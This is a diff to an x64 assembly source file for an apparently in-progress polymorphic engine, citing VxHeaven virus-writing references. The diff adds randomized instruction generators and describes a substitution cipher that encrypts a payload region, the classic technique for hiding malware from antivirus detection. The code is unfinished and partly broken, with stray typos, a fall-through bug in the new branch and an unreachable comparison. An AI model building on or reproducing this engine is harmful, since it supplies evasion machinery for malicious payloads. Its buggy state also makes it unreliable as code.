@@ -64,7 +64,6 @@
 ;       [3] https://vx-underground.org/archive/VxHeaven/lib/vmn04.html
 ;
 option win64:0x08   ; init shadow space, reserve stack at PROC level
-option zerolocals:1 ; autozero local vairable memory
 
 include .\poly.inc
 
@@ -84,22 +83,6 @@ REG_TABLE struct
     JunkReg_2 DWORD ?
     JunkReg_3 DWORD ?
 REG_TABLE ends
-
-; b. Semantic instruction table is implemented as a binary blob
-;    in the code section
-
-; c. Cipher semantics table is implemented in the code section
-CIPHER_TABLE struct
-    oSetLengthReg BYTE ?    ; 1. Set the length register to the size of the code
-    oSetSourceReg BYTE ?    ; 2. Set the source register to the start of the payload code
-    oSetKeyReg    BYTE ?    ; 3. Set the key register to the value of the key
-    oSetEncReg    BYTE ?    ; 4. Load data for encryption operation
-    oCipherOp     BYTE ?    ; 5. Perform encryption operation
-    oStoreResult  BYTE ?    ; 6. Store the result of the encryption operation
-    oIncSourceReg BYTE ?    ; 7. Increment the source register of the cipher operation size
-    oDecLenReg    BYTE ?    ; 8. Decrement the length register by the cipher operation size
-    oEncLoop      BYTE ?    ; 9. Return to four if the length register is not zero
-CIPHER_TABLE ends
 
 ;-----------------------------------------------------------------------------
 ;  1. Code section, proceeded by program entry
@@ -144,39 +127,30 @@ poly_begin:
         
         mov     rcx, 2
         call    rand_range
-        test    rax, rax
+        test    eax, eax
         jz      op0_t2
+        cmp     eax, 2
+        je      op0_t3
         
         op0_t1:          
             pop     rcx  
-            call    GenMovImm34
+            call    GenMovImm32
             jmp     permute_op1
 
         op0_t2:
             pop     rcx
             call    GenMovImm64
 
+        op0_t3:
+            pop     rcx
+            push    r8
+            call    GenMovImm32
+            add     ebx, eax
+            pop     r8
+            call    GenPushReg            
+
     permute_op1:
         add     ebx, eax                    ; Add the address offset of the modified code
-        lea     rcx, offset simple_substitution_cipher_setup
-        add     rcx, ebx                    ; Address for next instruction
-        push    rcx
-        lea     edx, offset poly_begin
-        mov     r8d, [r8].REG_TABLE.SourceReg
-        mov     ecx, 3
-        call    rand_range
-        test    rax, rax
-        jz      op1_t3
-
-        ; 32 bit permutation
-
-        ; 64 bit permutation
-        op1_t3:
-            pop     rcx
-
-
-
-
 
     epilog:
         pop     rsi
@@ -187,8 +161,8 @@ poly_begin:
     ; fastcall GenMov32(rcx=address, edx=value, r8d=index)
     GenMovImm32 PROC
         push    rbx
-        lea     rax, offset s_mov32_imm     ; Load the address of the opcode
-        mov     al, byte ptr [rax]          ; Load the opcode into al
+        mov     al, byte ptr s_mov_mem_reg
+                                            ; Load the opcode into al
         lea     rbx, s_regtable             ; Load the register value table
         or      al, byte ptr [rbx + r8]     ; OR the opcode with the value at the passed index
         mov     byte ptr [rcx], al          ; Set the first byte at address to the opcode
@@ -202,14 +176,11 @@ poly_begin:
     ; fastcall GenMov32(rcx=address, edx=value, r8=index)
     GenMovImm64 PROC
         push    rbx
-        lea     rax, offset s_64_rex_prefix
-        mov     al, byte ptr [rax]
+        mov     al, byte ptr s_rex_prefix
         mov     byte ptr [rcx], al          ; Set the REX prefix at address + 0
-        lea     rax, offset s_mov64_imm
-        mov     al, byte ptr [al]
+        mov     al, byte ptr s_mov64_imm
         mov     byte ptr [rcx + 1], al      ; Set the MOV opcode at address + 1
-        lea     rax, offset s_modrm
-        mov     al, byte ptr [rax]          ; Get a Mod/RM byte
+        mov     al, byte ptr s_modrm        ; Get a Mod/RM byte
         lea     rbx, offset s_regtable        
         or      al, byte ptr [rbx + r8]     ; OR the Mod RM byte with the proper register
         mov     byte ptr [rcx + 2], al      ; Set the Mod/RM byte at address + 2
@@ -219,14 +190,44 @@ poly_begin:
         ret
     GenMovImm64 ENDP
 
+    ; fastcall GenMovReg32(rcx=address, rdx=src_index, r8=dest_index)
     GenMovReg32 PROC
         push    rbx
-        lea     rax, offset s_mov_mem_reg
-
+        mov     al, byte ptr s_mov_mem_reg  ; Set al to 0x89
+        mov     byte ptr [rcx + 1], al      ; Set the opcode
+        mov     al, byte ptr s_modrm        ; Get the modrm default byte
+        lea     rbx, offset s_regtable      ; Get the register value table
+        mov     bl, byte ptr [rbx + r8]     ; Get the dest register encoding by index
+        shl     bl, 3                       ; Shift the dest into the dest bits of mod/rm
+        or      al, bl                      ; OR the dest into the mod/rm variable
+        lea     rbx, offset s_regtable      ; Get the register value table again
+        mov     bl, byte ptr [rbx + rdx]    ; Get the source by index
+        or      al, bl                      ; OR the source into the Mod/RM
+        mov     byte ptr [rcx + 2], al      ; Set the newly generated Mod/RM byte
+        mov     eax, 3                      ; This operation wrote three bytes
+        pop     rbx                 
+        ret
     GenMovReg32 ENDP
 
+    ; fastcall GenMovReg32(rcx=address, rdx=src_index, r8=dest_index)
     GenMovReg64 PROC
-
+        push    rbx
+        mov     al, byte ptr s_rex_prefix
+        mov     byte ptr [rcx], al          ; Set the REX prefix
+        mov     al, byte ptr s_mov_mem_reg  ; Set al to 0x89
+        mov     byte ptr [rcx + 1], al      ; Set the opcode
+        mov     al, byte ptr s_modrm        ; Get the modrm default byte
+        lea     rbx, offset s_regtable      ; Get the register value table
+        mov     bl, byte ptr [rbx + r8]     ; Get the dest register encoding by index
+        shl     bl, 3                       ; Shift the dest into the dest bits of mod/rm
+        or      al, bl                      ; OR the dest into the mod/rm variable
+        lea     rbx, offset s_regtable      ; Get the register value table again
+        mov     bl, byte ptr [rbx + rdx]    ; Get the source by index
+        or      al, bl                      ; OR the source into the Mod/RM
+        mov     byte ptr [rcx + 2], al      ; Set the newly generated Mod/RM byte
+        mov     eax, 3                      ; This operation wrote three bytes
+        pop     rbx                 
+        ret
     GenMovReg64 ENDP
 
     ; fastcall GenPushReg(rcx=address, edx=reg_index)
@@ -244,7 +245,7 @@ poly_begin:
     ; fastcall GenPushReg(rcx=address, edx=reg_index)
     GenPopReg PROC
         push    rbx         
-        lea     rax, offset s_pop]_reg      ; Get the POP opcode
+        lea     rax, offset s_pop_reg      ; Get the POP opcode
         lea     rbx, offset s_regtable      ; Get the regtable offset
         or      al, byte ptr [rbx + rdx]    ; Or the the POP opcode with [regtable + index]
         mov     byte ptr [rcx], al          ; Overwrite the original byte        
@@ -253,11 +254,12 @@ poly_begin:
         ret
     GenPopReg ENDP
     
-
+; b. Skeleton instruction table is implemented as a binary blob
+;    in the code section
 stable_begin:
     s_modrm:
-        db 11000000b    ; 0xC0 Mod/RM byte
-    s_64_rex_prefix:
+        db 11000000b    ; 0xC0 Mod/RM byte. Least significant bits are dest in reg mode
+    s_rex_prefix:
         db 01001000b    ; 0x48 REX prefix
     s_mov64_imm:
         db 11000111b    ; 0xC7 ( +4 bytes for imm)
@@ -355,8 +357,17 @@ stable_end:
 ; End of encoded data.
 align 2
 poly_end:
-    ;  Simple substition cipher [3]
-    ;
+
+    ; semantic description of cipher
+    ; 1. Set the length register to the size of the code
+    ; 2. Set the source register to the start of the payload code
+    ; 3. Set the key register to the value of the key
+    ; 4. Load data for encryption operation
+    ; 5. Perform encryption operation
+    ; 6. Store the result of the encryption operation
+    ; 7. Increment the source register of the cipher operation size
+    ; 8. Decrement the length register by the cipher operation size
+    ; 9. Return to four if the length register is not zero
     simple_substitution_cipher:
         simple_substitution_cipher_setup:
             mov     rcx, (offset poly_end - offset poly_begin) / 2 
